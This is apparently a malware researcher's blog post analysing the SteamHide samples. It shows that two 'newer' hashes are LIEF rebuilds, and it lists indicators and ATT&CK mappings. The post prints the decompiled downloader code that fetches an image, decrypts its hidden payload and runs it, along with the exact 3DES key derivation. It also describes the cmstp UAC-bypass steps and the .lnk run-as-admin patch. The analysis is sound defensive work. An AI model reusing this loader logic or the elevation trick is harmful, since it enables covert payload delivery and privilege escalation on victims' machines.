---
title: "SteamHide's newer samples are the old ones after a pass through LIEF"
date: 2026-11-18T20:30:02+00:00
slug: "steamhide-lief-copies"
description: "G Data's four SteamHide hashes are two builds: the 'newer' pair is the first pair with its resources rebuilt by LIEF, and it reads the same Steam profile."
tags: ["steamhide", "steganography", "dotnet", "steam", "uac-bypass", "lief"]
sample:
  family: "SteamHide"
  sha256: "148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339"
  source: "[MalwareBazaar](https://bazaar.abuse.ch/sample/148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339/)"
scope: medium
toc: true
---

G Data's SteamHide report lists four SHA-256 hashes: two downloaders that pull an encrypted executable out of an image on a Steam profile, and two copies of the backdoor they deliver. It calls the second pair "newer samples" whose downloader "uses a different Steam profile". The files are newer, but the builds aren't, and the profile is the same.

Each file in the second pair has the same code bytes and PE timestamp as its counterpart in the first pair. The files differ only in layout: a 4th section named `.l2`, which is the name [LIEF](https://github.com/lief-project/LIEF)'s PE builder gives a resource table it rebuilds.

Five years on, the profile and the Pastebin paste the backdoor is configured with are both still online. The paste holds `hxxp://192.168.0[.]24/upload.php`, a private LAN address.

Sources:

- Karsten Hahn of G Data, [Picture this: Malware Hides in Steam Profile Images](https://blog.gdatasoftware.com/2021/06/36861-malware-hides-in-steam-profile-images) (2021-06-08): the technique and the four hashes.
- TheAbsnt's two-part write-up from 2024 ([part I](https://theabsnt.github.io/malware-analysis/steamhide-analysis/part01), [part II](https://theabsnt.github.io/malware-analysis/steamhide-analysis/part02)): the main flow, which I don't repeat here.
- MalwareBazaar has the first pair; only Hybrid Analysis has the second ([downloader](https://www.hybrid-analysis.com/sample/368c97aef6c41b83d06c0ebb1f52679ff96a9aea35499a1caa8c3115cd16880b), [backdoor](https://www.hybrid-analysis.com/sample/194c18dc8bc923887ff6b6f2acacd00b54890ca1c52233581c7802fd176dc056)).

## What I found

- The four hashes are two builds. `368c97ae` is `148914b6` and `194c18dc` is `b41868a6`, each with its resources rebuilt by LIEF into a new `.l2` section.
- The payload key is `SHA-512` iterated 192 times through `PasswordDeriveBytes`. G Data printed the password with doubled backslashes, and that string derives a different key.
- After the 2021 images were removed, the downloader most likely ran 3,040 bytes of junk decrypted from a 2017 JPEG. Since Steam's image host change, it throws before writing anything.
- On a first run as an unelevated administrator, the cmstp INF trick starts a second, elevated copy. Both copies write a `BroMal` Run value, and neither does anything after that.
- The dormant code includes a shortcut patcher that sets the "Run as administrator" bit in `.lnk` files.

![Chain from the advance40 profile page through the first full-width image and its ICC profile to steam.exe and the backdoor; a dashed edge shows today's failure, an empty URL that throws](/img/steamhide-lief-copies/chain.svg "The 2021 chain, and where it stops today")

The solid path is how it worked in May 2021. The dashed edge is what the same code does against today's page.

## Two hashes, one build

I began by taking G Data's sentence at face value, so I expected one changed string in `368c97ae`. Decompiling both downloaders gave identical projects. So did both backdoors:

```console
$ diff -r src/148914b6 src/368c97ae
Only in 148914b6: 148914b6c64c...e339.csproj
Only in 368c97ae: 368c97aef6c4...880b.csproj
$ diff -r src/b41868a6 src/194c18dc
Only in 194c18dc: 194c18dc8bc9...c056.csproj
Only in b41868a6: b41868a6a32a...a6ae.csproj
```

The only differences are the project files, named after the input hash. A decompiler could still hide a string difference, so I compared the sections by bytes:

| | 148914b6 (Bazaar) | 368c97ae (HA) |
|---|---|---|
| size | 16,896 | 19,456 |
| TimeDateStamp | 0x609DCE98 (2021-05-14 01:12:56 UTC) | 0x609DCE98 |
| SizeOfHeaders | 0x200 | 0x400 |
| `.text` / `.rsrc` / `.reloc` | reference | 0 bytes differ |
| extra section | none | `.l2`, RVA 0xA000, 0x800 bytes, `0x40000040` |

The backdoor pair has the same layout, with `.text` identical and `.l2` at 0xC000. The headers grew to make room for a 4th section entry, so every section moved 0x200 bytes down the file. Nothing updated the debug directory's file pointer, which is why the second pair shows no PDB path in tools that follow it.

The section name identifies the tool. From LIEF's [`src/PE/Builder.cpp`](https://github.com/lief-project/LIEF/blob/0.11.5/src/PE/Builder.cpp) at 0.11.5:

```cpp
Section new_section_rsrc{".l" + std::to_string(static_cast<uint32_t>(DATA_DIRECTORY::RESOURCE_TABLE))};
new_section_rsrc.characteristics(0x40000040);
```

`RESOURCE_TABLE` is directory 2, so the section is `.l2` with `0x40000040`, which is what both files carry. I'm confident someone opened `148914b6` and `b41868a6` in LIEF and wrote them back with resource rebuilding on.

Hybrid Analysis lists both with a submission date of 2021-05-26, 12 days after the originals reached MalwareBazaar. I can't tell who rebuilt them or why. They aren't a later campaign, and they don't name a second profile.

## The downloader reads one image property and decrypts it

The downloader is a 16,896-byte Visual Basic .NET form that hides itself and does everything in `Form1_Load`. Trimmed:

```csharp
// (1)
string pattern = "<img style=\"width: 100%;\" src=\"(https://steamuserimages-a.akamaihd.net/ugc/\\d+/.*?/)?";
webClient2.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0");
input = webClient2.DownloadString("https://steamcommunity.com/id/advance40/images");
Match match = Regex.Match(input, pattern);
if (match.Success) {
    text = match.Groups[1].Value;                                   // (2)
    webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19");
    byte[] array = webClient.DownloadData(text);
    Image val = Image.FromStream(new MemoryStream(array));
    byte[] value = val.GetPropertyItem(34675).Value;                // (3)
    byte[] bytes = DecryptBytes(value, "{PjlD\\bzxS#;8@\\x.3JT&<4^MsTqE0", 192);
    File.WriteAllBytes("steam.exe", bytes);                         // (4)
    Process.Start("steam.exe");
}
```

At (1), the pattern looks for the first full-width image on the profile's images page. The `?` after the group makes the URL optional, which matters later. At (2), the downloader fetches the image with a different User-Agent, a Chrome 1.0 build on Windows XP.

At (3), it reads GDI+ property 34675 (0x8773), the image's embedded ICC color profile. (4) writes the decrypted bytes to `steam.exe` in the current directory and starts it.

`DecryptBytes` calls `CryptBytes`, a standard .NET pattern: `PasswordDeriveBytes(password, SALT, "SHA512", 192)`, then 24 bytes of 3DES key and 8 bytes of IV. For a request that fits in one hash output, that reduces to:

```text
h = SHA512(password_utf8 || salt)
repeat 190 times: h = SHA512(h)           ; iterations - 2
block = SHA512(h)
key = block[0:24]   iv = block[24:32]     ; 3DES-CBC, PKCS#7
salt = 22 41 0B 0C 10 00 41 80 5C 48 41 17 57 0B 0A 08
```

I checked my Python version against .NET's own class instead of trusting the reduction. Both derived key `5AD3B743A474B24211B3809D07D6B517365F6161BF8A975B` and IV `5F49826133F6F7A2`. I encrypted the backdoor with .NET's `TripleDES` and decrypted it with Python, and got `b41868a6...a6ae` back byte for byte.

The password in the `#US` heap is 30 characters with two single backslashes. G Data's report prints it as it appears in C# source, with doubled backslashes. Copied literally, that 32-character string derives `D072C61A...`, the wrong key. TheAbsnt's part I has the right password but describes the hash as SHA256; the code passes `"SHA512"`.

## Steam moved its images, and the regex still matches

The profile `advance40` still resolves. On 2026-11-18 its images page showed three items posted between 2015 and 2017, so the images G Data photographed are gone. The one JPEG carries a normal 3,048-byte ICC profile, which does not decrypt under the key.

I expected the downloader's regex to fail on today's page, since Steam no longer uses `steamuserimages-a.akamaihd[.]net`. It doesn't fail. I fetched the page with the downloader's User-Agent and ran the exact pattern through .NET's `Regex`:

```console
$ dotnet dncheck.dll regex steam_profile_ua.html
success=True group1=[] group1.Success=False index=37129
DownloadData: System.ArgumentException: The value cannot be an empty string. (Parameter 'path')
```

The `<img>` prefix still appears and the optional group matches nothing, so `match.Success` is true and the URL is an empty string. `WebClient.DownloadData("")` throws before any network call, and the downloader never reaches `File.WriteAllBytes`. My check used .NET 8; I did not test it on .NET Framework 4.5, which the downloader targets.

That explains today. It doesn't explain 2024, and I first got this wrong.

TheAbsnt wrote in part I that the page "does not return the intended image url, which is why the steam.exe turn out to be invalid executable". I read that as the same empty-URL failure. It can't be, because an empty URL throws before anything is written, and TheAbsnt got a file.

Today's page has exactly one full-width image, the 2017 JPEG. While Steam still served it from the akamaihd host, the regex would have captured its URL. Its real ICC profile fails the padding check, and `CryptBytes` catches and ignores the exception, keeping what it decrypted before the last block:

```console
$ dotnet dncheck.dll decswallow jpeg2017_icc.bin
swallowed System.Security.Cryptography.CryptographicException
in=3048 out=3040 mz=False
```

That's 3,040 bytes of noise, written as `steam.exe` and started, which matches "invalid executable". So the downloader died when the 2021 images were removed, and the host change only moved the failure earlier.

## What the backdoor runs on a first launch

`FinalMalware.exe` is a 23,552-byte C# form. All of its live behavior is in `Form1_Load`:

```csharp
if (!Evasion.IsInsideVM()) {                     // "VBOX"/"VMware" in Win32_DiskDrive
    // (1)
    if (Admin.Check() || !Evasion.CheckFirstRun() || TryPrivilegeEscalation()) { }
    AddPersistence();                                // (2)
    PopulateSearchPaths();
    PopulateShortcuts();                             // (3)
    Apps.EnumerateVulnerable(Apps.APPS_PATH, SearchOption.AllDirectories);
} else {
    Application.Exit();
}
```

The `if` at (1) has an empty body and exists for its short-circuit order. An administrator stops at `Admin.Check()`. Anyone else, including an administrator account running with a filtered token, reaches `CheckFirstRun()`.

`CheckFirstRun()` creates the empty marker `%LOCALAPPDATA%\uNoFGmsEX\uNoFGmsEX..txt` and returns true the first time. Only then does `TryPrivilegeEscalation()` run. G Data wrote that the backdoor "copies itself to the LOCALAPPDATA folder". It doesn't: `File.Create` makes the empty marker and nothing copies the executable.

The escalation is the public cmstp UAC bypass found in several GitHub projects, such as [NYAN-x-CAT/UAC-Escaper](https://github.com/NYAN-x-CAT/UAC-Escaper), with the service name changed to `broVPN`. It writes the INF to `%WINDIR%\Temp\<random>.inf`, runs `cmstp.exe /au <inf>`, then spins until a cmstp window appears and sends Enter. There is no timeout, so a blocked cmstp leaves the loop running forever.

If the bypass works, the INF starts a second, elevated `FinalMalware` from the same path. Both copies reach (2), and each adds the Run value `BroMal`, in HKLM when elevated and HKCU otherwise. So a successful first run leaves two Run entries and two running processes.

There is no mutex: `CheckMutexRunning` has no caller in the IL, although G Data lists the mutex among the behaviors. After (3) the form is hidden, and a 60-second timer that nothing ever starts leaves the process idle until logoff.

## What it carries and never calls

I checked every method below for call sites in the IL and every config field for loads. None has a caller in either build.

| member | what it would do |
|---|---|
| `Updater.GetNewVersion(profileId)` | fetch a profile's images, same regex and decryption, write `steam.exe` (never started) |
| config field `CC` | `hxxps://pastebin[.]com/raw/xLTeenQV` |
| `CreateTwitterRequest(...)` | build a GET with `x-guest-token` and `x-csrf-token` headers, no URL |
| `CodePiece.GenerateCode` / `RunCode` | compile C# in memory, then call `About.Decode.Main(string)` |
| `ShortcutUtils.ChangeRunMode(path)` | write `0x20` at offset 21 of a `.lnk` file |
| `Evasion.ChangeHash`, `Apps.FilterApps` | empty |

The Pastebin paste was created on 13 May 2021, less than three hours before the downloader's compile time, and last edited on 16 May. On 2026-11-18 it returned 30 bytes:

```text
http://192.168.0.24/upload.php
```

That's an RFC 1918 address, meaningful only on whichever LAN it was set up for. G Data describes the paste as holding the "initial command-and-control server IP"; I can't know what it held between 13 and 16 May. With the stubs in the table, I think this was a project still in development, as G Data's own update suggests.

`ChangeRunMode` is the part neither report mentions. Offset 21 is the second byte of the shell link header's `LinkFlags`:

![Shell link header: 4-byte HeaderSize, 16-byte LinkCLSID, then the four LinkFlags bytes at 0x14 to 0x17; the byte at 0x15 is set to 0x20](/img/steamhide-lief-copies/lnk.svg "What ChangeRunMode writes")

`0x20` in that byte is bit 13, `SLDF_RUNAS_USER`, the "Run as administrator" checkbox. The code writes the whole byte, so it also clears the other flags in bits 8–15.

`EnumerateShortcuts` already collects every `*.lnk` under Desktop and Documents. I think the plan was to make the user's own shortcuts ask for elevation, so that a UAC prompt from a familiar icon would look normal. Nothing calls it, so that's inference from two pieces that were never connected.

The Squirrel check doesn't look for Teams specifically. `EnumerateVulnerable` records each folder directly under `%LOCALAPPDATA%` that contains `SquirrelSetup.log`, so apps installed deeper, such as classic Teams under `Microsoft\Teams`, are missed.

## The extractor

[families/steamhide](https://github.com/stateless-re/tools/tree/main/families/steamhide) does both sides. Given a downloader or backdoor, it reads the password, salt, profile URL, regex and Pastebin URLs. Given an image, it finds the ICC data, decrypts it, and writes the payload only with `-o`.

None of the 2021 carrier images is public, so I tested the tool on carriers I built from .NET-encrypted ciphertext. On Steam's remaining JPEG it correctly reports a genuine ICC profile that doesn't decrypt.

## What I couldn't determine

The 2021 images are gone from the profile, and no archive captured the images page, so I couldn't test the extractor on a real carrier or see whether the operators ever posted a second payload. Who ran the samples through LIEF is unknown. The Twitter request has headers and no endpoint, so its purpose is a guess either way.

## Indicators

| SHA-256 | role |
|---|---|
| 148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339 | downloader, `Hide binary inside image.exe` |
| 368c97aef6c41b83d06c0ebb1f52679ff96a9aea35499a1caa8c3115cd16880b | same downloader after a LIEF resource rebuild |
| b41868a6a32a7e1167f4e76e2f3cf565b6c0875924f9d809d889eae9cb56a6ae | backdoor, `FinalMalware.exe` (written as `steam.exe`) |
| 194c18dc8bc923887ff6b6f2acacd00b54890ca1c52233581c7802fd176dc056 | same backdoor after a LIEF resource rebuild |

Network:

- `hxxps://steamcommunity[.]com/id/advance40/images` (profile page; still online, 2021 images removed)
- `hxxps://steamuserimages-a.akamaihd[.]net/ugc/<id>/<hash>/` (image URL shape the regex expects)
- `hxxps://pastebin[.]com/raw/xLTeenQV` (configured, never read; holds `hxxp://192.168.0[.]24/upload.php`)
- User-Agents, profile page first, then image:

```text
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19
  (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19
```

The second string is one line; it's wrapped here.

Host:

- `steam.exe` written to the downloader's working directory
- `%LOCALAPPDATA%\uNoFGmsEX\uNoFGmsEX..txt` (empty marker)
- `HKCU` and `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BroMal`
- `%WINDIR%\Temp\<random>.inf` containing `ServiceName="broVPN"`, followed by `cmstp.exe /au`

## ATT&CK

| ID | technique | here |
|---|---|---|
| T1027.003 | Steganography | payload in the image's ICC profile property (0x8773) |
| T1102 | Web Service | Steam profile as payload host |
| T1105 | Ingress Tool Transfer | downloader fetches and writes `steam.exe` |
| T1140 | Deobfuscate/Decode Files | 3DES with a `PasswordDeriveBytes` key |
| T1497.001 | System Checks | `Win32_DiskDrive` caption contains VBOX or VMware |
| T1548.002 | Bypass User Account Control | cmstp INF with `/au` |
| T1547.001 | Registry Run Keys | `BroMal` under HKCU and HKLM |

SteamHide's distinctive idea, a payload in a Steam profile image that the operator can swap without touching the downloader, also meant the downloader worked only while that image was there. Once the images were deleted it ran junk, and since Steam's host change it runs nothing.

The network side was always weak, since everything goes over HTTPS to Steam and the image is decoded in memory. The host side is not: a `steam.exe` in some random working directory, a `BroMal` Run value, and `cmstp.exe /au` reading an INF from `%WINDIR%\Temp` are each worth an alert on their own.

## Credits

Karsten Hahn (G Data) for the [original report](https://blog.gdatasoftware.com/2021/06/36861-malware-hides-in-steam-profile-images), and @miltinhoc for the first tweets. TheAbsnt for the 2024 two-part analysis, which has the right password and the right first-run behavior. `GEI_MC` for uploading the first pair to MalwareBazaar. The [LIEF](https://github.com/lief-project/LIEF) builder source made the `.l2` section easy to recognize.
